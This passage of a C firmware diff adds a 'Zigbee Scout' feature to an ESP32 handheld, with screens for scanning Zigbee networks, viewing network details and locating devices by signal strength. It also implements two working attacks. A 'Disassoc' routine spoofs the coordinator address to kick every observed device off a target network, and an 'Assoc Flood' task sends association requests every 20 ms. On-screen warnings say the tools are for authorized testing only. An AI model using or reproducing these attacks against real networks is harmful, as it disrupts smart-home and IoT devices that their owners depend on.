+    lv_obj_t *msg = lv_label_create(popup);
+    lv_label_set_text(msg, "Active mode transmits 802.15.4\nbeacon requests. Use only on\nnetworks you own or have\nexplicit written permission\nto test.");
+    lv_obj_set_style_text_font(msg, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(msg, lv_color_hex(0xCCCCCC), 0);
+    lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 18);
+    lv_label_set_long_mode(msg, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(msg, 200);
+
+    lv_obj_t *ok_btn = lv_btn_create(popup);
+    lv_obj_set_size(ok_btn, 90, 28);
+    lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_RIGHT, 0, 0);
+    lv_obj_set_style_bg_color(ok_btn, lv_color_hex(0xB71C1C), LV_STATE_DEFAULT);
+    lv_obj_set_style_radius(ok_btn, 5, 0);
+    lv_obj_t *ok_lbl = lv_label_create(ok_btn);
+    lv_label_set_text(ok_lbl, "Proceed");
+    lv_obj_set_style_text_font(ok_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(ok_lbl, lv_color_white(), 0);
+    lv_obj_center(ok_lbl);
+    lv_obj_add_event_cb(ok_btn, s_zgwd_active_disclaimer_ok_cb, LV_EVENT_CLICKED, popup);
+
+    lv_obj_t *cancel_btn = lv_btn_create(popup);
+    lv_obj_set_size(cancel_btn, 90, 28);
+    lv_obj_align(cancel_btn, LV_ALIGN_BOTTOM_LEFT, 0, 0);
+    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x424242), LV_STATE_DEFAULT);
+    lv_obj_set_style_radius(cancel_btn, 5, 0);
+    lv_obj_t *can_lbl = lv_label_create(cancel_btn);
+    lv_label_set_text(can_lbl, "Cancel");
+    lv_obj_set_style_text_font(can_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(can_lbl, lv_color_white(), 0);
+    lv_obj_center(can_lbl);
+    lv_obj_add_event_cb(cancel_btn, s_zgwd_popup_dismiss_cb, LV_EVENT_CLICKED, popup);
+}
+
+// ── Back callback ─────────────────────────────────────────────────────────────
 static void s_zgwd_back_cb(lv_event_t *e)
 {
     (void)e;
     zgwd_ctx_t *ctx = s_zgwd;
     if (ctx) {
-        ctx->cancel = true;
-        ctx->active = false;
-        ctx->status_lbl = NULL;
-        ctx->pan_list   = NULL;
-        ctx->start_btn  = NULL;
+        ctx->cancel      = true;
+        ctx->scanning    = false;
+        ctx->status_lbl  = NULL;
+        ctx->pan_list    = NULL;
+        ctx->passive_btn = NULL;
+        ctx->active_btn  = NULL;
         if (ctx->tmr) { lv_timer_del(ctx->tmr); ctx->tmr = NULL; }
     }
-    show_main_tiles();  // → reset_function_page_children frees ctx if task=NULL
+    show_main_tiles();
 }
 
 // ── Main Zigbee Scout screen ──────────────────────────────────────────────────
 static void show_zigbee_wardrive_screen(void)
 {
-    // Create RX queue (persists across visits)
     if (!s_zgwd_rx_q)
         s_zgwd_rx_q = xQueueCreate(ZGWD_Q_DEPTH, sizeof(zgwd_frame_msg_t));
 
     zgwd_ctx_t *ctx = heap_caps_calloc(1, sizeof(zgwd_ctx_t), MALLOC_CAP_SPIRAM);
-    if (!ctx) {
-        ESP_LOGE(TAG, "[ZGWD] OOM");
-        return;
-    }
+    if (!ctx) { ESP_LOGE(TAG, "[ZGWD] OOM"); return; }
 
-    // MUST call create_function_page_base BEFORE assigning s_zgwd.
-    // create_function_page_base → reset_function_page_children cancels+frees any previous
-    // s_zgwd with task=NULL; with task still running it nulls UI pointers and leaves ctx alive.
     create_function_page_base("Zigbee Scout");
-    s_zgwd = ctx;   // assign AFTER cleanup has run
+    s_zgwd = ctx;
     apply_menu_bg();
 
-    // ── Status line (single clipped line below title bar) ────────────────────
     ctx->status_lbl = lv_label_create(function_page);
-    lv_label_set_text(ctx->status_lbl, "802.15.4 Ch 11-26  |  Press Start");
+    lv_label_set_text(ctx->status_lbl, "802.15.4 Ch 11-26  |  Tap card for details");
     lv_obj_set_style_text_font(ctx->status_lbl, &lv_font_montserrat_12, 0);
     lv_obj_set_style_text_color(ctx->status_lbl, lv_color_hex(0x42A5F5), 0);
     lv_label_set_long_mode(ctx->status_lbl, LV_LABEL_LONG_CLIP);
     lv_obj_set_width(ctx->status_lbl, LCD_H_RES - 8);
     lv_obj_align(ctx->status_lbl, LV_ALIGN_TOP_LEFT, 4, 32);
 
-    // ── Scrollable PAN list ───────────────────────────────────────────────────
+    // Scrollable PAN list — shrunk to leave room for two button rows
     ctx->pan_list = lv_obj_create(function_page);
-    lv_obj_set_size(ctx->pan_list, LCD_H_RES, LCD_V_RES - 50 - 36 - 34);
+    lv_obj_set_size(ctx->pan_list, LCD_H_RES, LCD_V_RES - 50 - 36 - 36 - 4);
     lv_obj_align(ctx->pan_list, LV_ALIGN_TOP_MID, 0, 50);
     lv_obj_set_style_bg_color(ctx->pan_list, ui_bg_color(), 0);
     lv_obj_set_style_border_color(ctx->pan_list, lv_color_hex(0x00695C), 0);
@@ -41960,26 +42298,23 @@ static void show_zigbee_wardrive_screen(void)
     lv_obj_set_scrollbar_mode(ctx->pan_list, LV_SCROLLBAR_MODE_AUTO);
 
     lv_obj_t *hint0 = lv_label_create(ctx->pan_list);
-    lv_label_set_text(hint0, "Press Start to begin passive scan");
+    lv_label_set_text(hint0, "Press a Start button to scan");
     lv_obj_set_style_text_font(hint0, &lv_font_montserrat_12, 0);
     lv_obj_set_style_text_color(hint0, lv_color_make(120, 120, 120), 0);
 
-    // ── Start / Stop button ───────────────────────────────────────────────────
-    ctx->start_btn = lv_btn_create(function_page);
-    lv_obj_set_size(ctx->start_btn, 140, 32);
-    lv_obj_align(ctx->start_btn, LV_ALIGN_BOTTOM_MID, 0, -38);
-    lv_obj_set_style_bg_color(ctx->start_btn, lv_color_hex(0x00695C), LV_STATE_DEFAULT);
-    lv_obj_set_style_bg_color(ctx->start_btn, lv_color_hex(0x00796B), LV_STATE_PRESSED);
-    lv_obj_set_style_border_width(ctx->start_btn, 0, 0);
-    lv_obj_set_style_radius(ctx->start_btn, 6, 0);
-    lv_obj_t *bl = lv_label_create(ctx->start_btn);
-    lv_label_set_text(bl, LV_SYMBOL_PLAY "  Start");
-    lv_obj_set_style_text_font(bl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(bl, lv_color_white(), 0);
-    lv_obj_center(bl);
-    lv_obj_add_event_cb(ctx->start_btn, s_zgwd_startstop_cb, LV_EVENT_CLICKED, NULL);
+    // Passive button (teal, left half)
+    ctx->passive_btn = s_zgwd_make_btn(function_page,
+        LV_SYMBOL_PLAY "  Passive", lv_color_hex(0x00695C),
+        LV_ALIGN_BOTTOM_LEFT, 8, -38, (LCD_H_RES/2) - 12, 32);
+    lv_obj_add_event_cb(ctx->passive_btn, s_zgwd_passive_cb, LV_EVENT_CLICKED, NULL);
 
-    // ── Back button ───────────────────────────────────────────────────────────
+    // Active button (red, right half)
+    ctx->active_btn = s_zgwd_make_btn(function_page,
+        LV_SYMBOL_WARNING "  Active", lv_color_hex(0xB71C1C),
+        LV_ALIGN_BOTTOM_RIGHT, -8, -38, (LCD_H_RES/2) - 12, 32);
+    lv_obj_add_event_cb(ctx->active_btn, s_zgwd_active_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
     lv_obj_t *back_btn = lv_btn_create(function_page);
     lv_obj_set_size(back_btn, LCD_H_RES - 16, 30);
     lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -4);
@@ -41996,4 +42331,377 @@ static void show_zigbee_wardrive_screen(void)
     lv_obj_add_event_cb(back_btn, s_zgwd_back_cb, LV_EVENT_CLICKED, NULL);
 
     ctx->tmr = lv_timer_create(s_zgwd_ui_timer_cb, 500, NULL);
+}
+
+// ── PAN detail screen ─────────────────────────────────────────────────────────
+static void s_zgwd_detail_back_cb(lv_event_t *e) { (void)e; show_main_tiles(); }
+
+static void s_zgwd_disassoc_all_cb(lv_event_t *e)
+{
+    (void)e;
+    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
+    if (!s_zgwd_tx_sem) s_zgwd_tx_sem = xSemaphoreCreateBinary();
+    // Radio must already be enabled from the scout session; if not, just log
+    if (pe->device_count == 0) {
+        ESP_LOGW(TAG, "[ZGWD] No devices to disassoc");
+        return;
+    }
+    // Set channel to target PAN's channel
+    esp_ieee802154_set_channel(pe->channel);
+    esp_ieee802154_set_panid(pe->pan_id);
+    esp_ieee802154_set_short_address(0x0000); // spoof coordinator address
+    for (int i = 0; i < pe->device_count; i++) {
+        for (int r = 0; r < 3; r++) {   // 3 retries per device
+            s_zgwd_send_disassoc(pe->pan_id, pe->devices[i]);
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        ESP_LOGI(TAG, "[ZGWD] Disassoc sent to 0x%04X on PAN 0x%04X",
+                 pe->devices[i], pe->pan_id);
+    }
+    // Restore
+    esp_ieee802154_set_panid(0xFFFF);
+    esp_ieee802154_set_short_address(0xFFFE);
+}
+
+static void s_zgwd_go_locate_cb(lv_event_t *e) { (void)e; show_zgwd_locator(0); }
+static void s_zgwd_go_flood_cb(lv_event_t *e)  { (void)e; show_zgwd_flood(0);   }
+
+static void s_zgwd_detail_addrow(lv_obj_t *parent, const char *text,
+                                  lv_color_t col, int y)
+{
+    lv_obj_t *l = lv_label_create(parent);
+    lv_label_set_text(l, text);
+    lv_obj_set_style_text_font(l, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(l, col, 0);
+    lv_label_set_long_mode(l, LV_LABEL_LONG_CLIP);
+    lv_obj_set_width(l, LCD_H_RES - 8);
+    lv_obj_align(l, LV_ALIGN_TOP_LEFT, 4, y);
+}
+
+static void show_zgwd_pan_detail(int pan_idx)
+{
+    (void)pan_idx;
+    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
+
+    create_function_page_base("PAN Detail");
+    apply_menu_bg();
+
+    int y = 32;
+    char buf[64];
+
+    snprintf(buf, sizeof(buf), "PAN  0x%04X   Channel %u", pe->pan_id, pe->channel);
+    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x4DB6AC), y); y += 18;
+
+    if (pe->ext_pan_id) {
+        snprintf(buf, sizeof(buf), "Ext PAN  %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X",
+                 (uint8_t)(pe->ext_pan_id),       (uint8_t)(pe->ext_pan_id >> 8),
+                 (uint8_t)(pe->ext_pan_id >> 16),  (uint8_t)(pe->ext_pan_id >> 24),
+                 (uint8_t)(pe->ext_pan_id >> 32),  (uint8_t)(pe->ext_pan_id >> 40),
+                 (uint8_t)(pe->ext_pan_id >> 48),  (uint8_t)(pe->ext_pan_id >> 56));
+        s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x80DEEA), y); y += 18;
+    }
+
+    const char *sp_str = pe->stack_profile == 1 ? "Zigbee" :
+                         pe->stack_profile == 2 ? "ZigbeePRO" : "Unknown";
+    snprintf(buf, sizeof(buf), "Stack: %s  Router:%s  EndDev:%s",
+             sp_str, pe->router_cap ? "Y" : "N", pe->end_dev_cap ? "Y" : "N");
+    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
+
+    snprintf(buf, sizeof(buf), "RSSI %d..%d dBm   Frames: %u",
+             (int)pe->rssi_min, (int)pe->rssi_max, (unsigned)pe->frame_count);
+    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
+
+    snprintf(buf, sizeof(buf), "Devices seen: %u", (unsigned)pe->device_count);
+    s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0xB0BEC5), y); y += 18;
+    for (int i = 0; i < pe->device_count && i < 6; i++) {
+        snprintf(buf, sizeof(buf), "  0x%04X", pe->devices[i]);
+        s_zgwd_detail_addrow(function_page, buf, lv_color_hex(0x78909C), y); y += 16;
+    }
+    if (pe->device_count > 6) {
+        s_zgwd_detail_addrow(function_page, "  ...more", lv_color_hex(0x78909C), y);
+        y += 16;
+    }
+
+    y += 6;
+    int btn_w = (LCD_H_RES - 24) / 3;
+
+    lv_obj_t *loc_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_BELL " Locate",
+        lv_color_hex(0x1565C0), LV_ALIGN_TOP_LEFT, 8, y, btn_w, 30);
+    lv_obj_add_event_cb(loc_btn, s_zgwd_go_locate_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *da_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_WARNING " Disassoc",
+        lv_color_hex(0xB71C1C), LV_ALIGN_TOP_MID, 0, y, btn_w, 30);
+    lv_obj_add_event_cb(da_btn, s_zgwd_disassoc_all_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *fl_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_REFRESH " Flood",
+        lv_color_hex(0x6A1B9A), LV_ALIGN_TOP_RIGHT, -8, y, btn_w, 30);
+    lv_obj_add_event_cb(fl_btn, s_zgwd_go_flood_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back
+    lv_obj_t *back = lv_btn_create(function_page);
+    lv_obj_set_size(back, LCD_H_RES - 16, 30);
+    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
+    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back, ui_card_pressed_color(), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(back, ui_border_color(), 0);
+    lv_obj_set_style_border_width(back, 1, 0);
+    lv_obj_set_style_radius(back, 6, 0);
+    lv_obj_t *blbl = lv_label_create(back);
+    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Back");
+    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
+    lv_obj_center(blbl);
+    lv_obj_add_event_cb(back, s_zgwd_detail_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// ── RSSI Locator screen ───────────────────────────────────────────────────────
+static void s_zgwd_loc_timer_cb(lv_timer_t *t)
+{
+    (void)t;
+    zgwd_loc_ctx_t *loc = s_zgwd_loc;
+    if (!loc || !loc->running) return;
+
+    // Drain queue, accept frames from locator's channel
+    zgwd_frame_msg_t msg;
+    bool got = false;
+    while (s_zgwd_rx_q && xQueueReceive(s_zgwd_rx_q, &msg, 0) == pdTRUE) {
+        if (msg.channel == loc->channel) {
+            loc->last_rssi = msg.rssi;
+            got = true;
+        }
+    }
+
+    if (loc->rssi_lbl) {
+        char buf[32];
+        if (got || loc->last_rssi != 0)
+            snprintf(buf, sizeof(buf), "RSSI: %d dBm", (int)loc->last_rssi);
+        else
+            snprintf(buf, sizeof(buf), "Waiting...");
+        lv_label_set_text(loc->rssi_lbl, buf);
+    }
+
+    if (loc->rssi_bar && (got || loc->last_rssi != 0)) {
+        // Map -90..-40 dBm → 0..100
+        int pct = (int)(loc->last_rssi + 90) * 100 / 50;
+        if (pct < 0) pct = 0;
+        if (pct > 100) pct = 100;
+        lv_bar_set_value(loc->rssi_bar, pct, LV_ANIM_ON);
+
+        // Vibration: silent below -75 dBm
+        if (loc->last_rssi > -75) {
+            int vpct = 10 + (loc->last_rssi + 75) * 90 / 35;
+            if (vpct < 10)  vpct = 10;
+            if (vpct > 100) vpct = 100;
+            g_vibtest_strength_pct = vpct;
+            vibrator_pulse(80);
+        }
+    }
+}
+
+static void s_zgwd_loc_back_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_zgwd_loc) {
+        s_zgwd_loc->running = false;
+        if (s_zgwd_loc->tmr) { lv_timer_del(s_zgwd_loc->tmr); s_zgwd_loc->tmr = NULL; }
+        heap_caps_free(s_zgwd_loc);
+        s_zgwd_loc = NULL;
+    }
+    vibrator_off();
+    g_vibtest_strength_pct = 100;
+    esp_ieee802154_sleep();
+    show_main_tiles();
+}
+
+static void show_zgwd_locator(int pan_idx)
+{
+    (void)pan_idx;
+    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
+
+    zgwd_loc_ctx_t *loc = heap_caps_calloc(1, sizeof(zgwd_loc_ctx_t), MALLOC_CAP_SPIRAM);
+    if (!loc) return;
+    loc->channel = pe->channel;
+    loc->running = true;
+
+    create_function_page_base("ZB Locator");
+    s_zgwd_loc = loc;
+    apply_menu_bg();
+
+    // PAN label
+    char buf[40];
+    snprintf(buf, sizeof(buf), "PAN 0x%04X  Ch %u", pe->pan_id, pe->channel);
+    loc->pan_lbl = lv_label_create(function_page);
+    lv_label_set_text(loc->pan_lbl, buf);
+    lv_obj_set_style_text_font(loc->pan_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(loc->pan_lbl, lv_color_hex(0x4DB6AC), 0);
+    lv_obj_align(loc->pan_lbl, LV_ALIGN_TOP_MID, 0, 35);
+
+    // RSSI bar
+    loc->rssi_bar = lv_bar_create(function_page);
+    lv_obj_set_size(loc->rssi_bar, LCD_H_RES - 32, 24);
+    lv_obj_align(loc->rssi_bar, LV_ALIGN_CENTER, 0, -20);
+    lv_bar_set_range(loc->rssi_bar, 0, 100);
+    lv_bar_set_value(loc->rssi_bar, 0, LV_ANIM_OFF);
+    lv_obj_set_style_bg_color(loc->rssi_bar, lv_color_hex(0x1B5E20), LV_PART_INDICATOR);
+    lv_obj_set_style_bg_color(loc->rssi_bar, lv_color_hex(0x333333), 0);
+    lv_obj_set_style_radius(loc->rssi_bar, 4, 0);
+
+    // RSSI text
+    loc->rssi_lbl = lv_label_create(function_page);
+    lv_label_set_text(loc->rssi_lbl, "Waiting...");
+    lv_obj_set_style_text_font(loc->rssi_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(loc->rssi_lbl, lv_color_hex(0xFFFFFF), 0);
+    lv_obj_align(loc->rssi_lbl, LV_ALIGN_CENTER, 0, 20);
+
+    lv_obj_t *hint = lv_label_create(function_page);
+    lv_label_set_text(hint, "Move closer to increase signal.\nVibration strengthens near source.");
+    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(hint, lv_color_make(140, 140, 140), 0);
+    lv_obj_align(hint, LV_ALIGN_CENTER, 0, 55);
+    lv_label_set_long_mode(hint, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(hint, LCD_H_RES - 20);
+
+    // Back button
+    lv_obj_t *back = lv_btn_create(function_page);
+    lv_obj_set_size(back, LCD_H_RES - 16, 30);
+    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
+    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
+    lv_obj_set_style_border_color(back, ui_border_color(), 0);
+    lv_obj_set_style_border_width(back, 1, 0);
+    lv_obj_set_style_radius(back, 6, 0);
+    lv_obj_t *blbl = lv_label_create(back);
+    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Stop & Back");
+    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
+    lv_obj_center(blbl);
+    lv_obj_add_event_cb(back, s_zgwd_loc_back_cb, LV_EVENT_CLICKED, NULL);
+
+    // Start listening on this channel
+    if (!s_zgwd_rx_q)
+        s_zgwd_rx_q = xQueueCreate(ZGWD_Q_DEPTH, sizeof(zgwd_frame_msg_t));
+    esp_ieee802154_enable();
+    esp_ieee802154_set_promiscuous(true);
+    esp_ieee802154_set_channel(pe->channel);
+    esp_ieee802154_receive();
+
+    loc->tmr = lv_timer_create(s_zgwd_loc_timer_cb, 500, NULL);
+}
+
+// ── Association Flood screen ──────────────────────────────────────────────────
+static void s_zgwd_flood_task_fn(void *arg)
+{
+    zgwd_flood_ctx_t *fld = (zgwd_flood_ctx_t *)arg;
+    if (!s_zgwd_tx_sem) s_zgwd_tx_sem = xSemaphoreCreateBinary();
+
+    esp_ieee802154_enable();
+    esp_ieee802154_set_promiscuous(false);
+    esp_ieee802154_set_coordinator(false);
+    esp_ieee802154_set_panid(fld->pan_id);
+    esp_ieee802154_set_short_address(0xFFFE);
+    esp_ieee802154_set_channel(fld->channel);
+    esp_ieee802154_receive();
+
+    while (!fld->cancel) {
+        s_zgwd_send_assoc_req(fld->pan_id);
+        fld->sent++;
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    esp_ieee802154_sleep();
+    esp_ieee802154_disable();
+    ensure_wifi_mode();
+    fld->task = NULL;
+    vTaskDelete(NULL);
+}
+
+static void s_zgwd_flood_ui_timer_cb(lv_timer_t *t)
+{
+    (void)t;
+    zgwd_flood_ctx_t *fld = s_zgwd_fld;
+    if (!fld) return;
+    if (fld->count_lbl) {
+        char buf[48];
+        snprintf(buf, sizeof(buf), "Requests sent: %d", fld->sent);
+        lv_label_set_text(fld->count_lbl, buf);
+    }
+    if (!fld->task && fld->stop_btn) {
+        lv_obj_t *l = lv_obj_get_child(fld->stop_btn, 0);
+        if (l) lv_label_set_text(l, LV_SYMBOL_OK "  Done");
+        lv_obj_add_state(fld->stop_btn, LV_STATE_DISABLED);
+    }
+}
+
+static void s_zgwd_flood_stop_cb(lv_event_t *e)
+{
+    (void)e;
+    zgwd_flood_ctx_t *fld = s_zgwd_fld;
+    if (fld) fld->cancel = true;
+}
+
+static void s_zgwd_flood_back_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_zgwd_fld) {
+        s_zgwd_fld->cancel = true;
+        if (s_zgwd_fld->tmr) { lv_timer_del(s_zgwd_fld->tmr); s_zgwd_fld->tmr = NULL; }
+        if (!s_zgwd_fld->task) { heap_caps_free(s_zgwd_fld); s_zgwd_fld = NULL; }
+    }
+    show_main_tiles();
+}
+
+static void show_zgwd_flood(int pan_idx)
+{
+    (void)pan_idx;
+    zgwd_pan_entry_t *pe = &s_zgwd_sel_pan;
+
+    zgwd_flood_ctx_t *fld = heap_caps_calloc(1, sizeof(zgwd_flood_ctx_t), MALLOC_CAP_SPIRAM);
+    if (!fld) return;
+    fld->pan_id  = pe->pan_id;
+    fld->channel = pe->channel;
+
+    create_function_page_base("Assoc Flood");
+    s_zgwd_fld = fld;
+    apply_menu_bg();
+
+    // Warning label
+    lv_obj_t *warn = lv_label_create(function_page);
+    lv_label_set_text(warn, "! FOR AUTHORIZED TESTING ONLY");
+    lv_obj_set_style_text_font(warn, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(warn, lv_color_hex(0xEF5350), 0);
+    lv_obj_align(warn, LV_ALIGN_TOP_MID, 0, 34);
+
+    char buf[48];
+    snprintf(buf, sizeof(buf), "Target: PAN 0x%04X  Ch %u", pe->pan_id, pe->channel);
+    lv_obj_t *tgt = lv_label_create(function_page);
+    lv_label_set_text(tgt, buf);
+    lv_obj_set_style_text_font(tgt, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(tgt, lv_color_hex(0x4DB6AC), 0);
+    lv_obj_align(tgt, LV_ALIGN_TOP_MID, 0, 54);
+
+    fld->count_lbl = lv_label_create(function_page);
+    lv_label_set_text(fld->count_lbl, "Requests sent: 0");
+    lv_obj_set_style_text_font(fld->count_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(fld->count_lbl, lv_color_hex(0xFFFFFF), 0);
+    lv_obj_align(fld->count_lbl, LV_ALIGN_CENTER, 0, 0);
+
+    fld->stop_btn = s_zgwd_make_btn(function_page, LV_SYMBOL_STOP "  Stop Flood",
+        lv_color_hex(0xB71C1C), LV_ALIGN_BOTTOM_MID, 0, -38, 160, 32);
+    lv_obj_add_event_cb(fld->stop_btn, s_zgwd_flood_stop_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *back = lv_btn_create(function_page);
+    lv_obj_set_size(back, LCD_H_RES - 16, 30);
+    lv_obj_align(back, LV_ALIGN_BOTTOM_MID, 0, -4);
+    lv_obj_set_style_bg_color(back, ui_panel_color(), LV_STATE_DEFAULT);
+    lv_obj_set_style_border_color(back, ui_border_color(), 0);
+    lv_obj_set_style_border_width(back, 1, 0);
+    lv_obj_set_style_radius(back, 6, 0);
+    lv_obj_t *blbl = lv_label_create(back);
+    lv_label_set_text(blbl, LV_SYMBOL_LEFT "  Stop & Back");
+    lv_obj_set_style_text_font(blbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(blbl, ui_text_color(), 0);
+    lv_obj_center(blbl);
+    lv_obj_add_event_cb(back, s_zgwd_flood_back_cb, LV_EVENT_CLICKED, NULL);
+
+    fld->tmr = lv_timer_create(s_zgwd_flood_ui_timer_cb, 300, NULL);
+    xTaskCreate(s_zgwd_flood_task_fn, "zgwdfld", 3072, fld, 2, &fld->task);
 }
